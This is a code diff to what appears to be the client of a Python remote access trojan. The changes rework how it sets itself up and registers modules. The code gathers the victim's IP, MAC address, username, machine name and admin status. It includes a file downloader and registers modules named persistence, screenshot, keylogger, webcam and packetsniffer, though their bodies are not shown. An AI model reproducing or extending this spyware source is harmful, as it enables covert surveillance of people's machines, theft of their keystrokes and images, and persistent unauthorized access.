@@ -80,20 +80,22 @@ else:
 
 
 class Client(object):
+    global _module
     global __modules__
     __modules__ = {}
     def __init__(self, *args, **kwargs):
         self.mode       = 0
         self.exit       = 0
         self.threads    = {}
+        self._setup(**kwargs)
         self.info       = self._info()
-        self.setup      = self._setup()
         self.logger     = self._logger()
-        self.result     = self._result()
         self.modules    = self._modules()
         self.commands   = self._commands()
+        self.result     = self._result()
 
 # ----------------- PRIVATE FUNCTIONS --------------------------
+    def _modules(self): return {mod: getattr(self, mod) for mod in __modules__}
 
     def _wget(self, target): return urlretrieve(target)[0]
     
@@ -105,15 +107,13 @@ class Client(object):
 
     def _unzip(self, fname): return ZipFile(fname).extractall('.')
 
-    def _modules(self): return {mod: getattr(self, mod) for mod in __modules__}
-
     def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
 
     def _commands(self): return {cmd: getattr(self, cmd) for cmd in vars(self) if '_' not in cmd}
     
     def _cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
-    def _setup(self): return [setattr(self, chr(i), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]
+    def _setup(self, **kwargs): return [setattr(self, chr(i), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
     def _info(self): return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
 
@@ -971,8 +971,6 @@ class Client(object):
     
     def info(self): return self._show(self.info)
 
-    def module(self, fx): return self._module(fx)
-
     def jobs(self): return self._show(self.threads)
     
     def use(self, module): return self._use(module)
@@ -981,19 +979,19 @@ class Client(object):
 
     def results(self): return self._show(self.result)
     
-    @module
+    @_module
     def persistence(self): return self._persistence()
     
-    @module
+    @_module
     def screenshot(self): return self._screenshot()
     
-    @module
+    @_module
     def keylogger(self): return self._keylogger()
     
-    @module
+    @_module
     def webcam(self): return self._webcam()
     
-    @module
+    @_module
     def packetsniffer(self): return self._packetsniffer()
 
 # ----------------- MAIN --------------------------
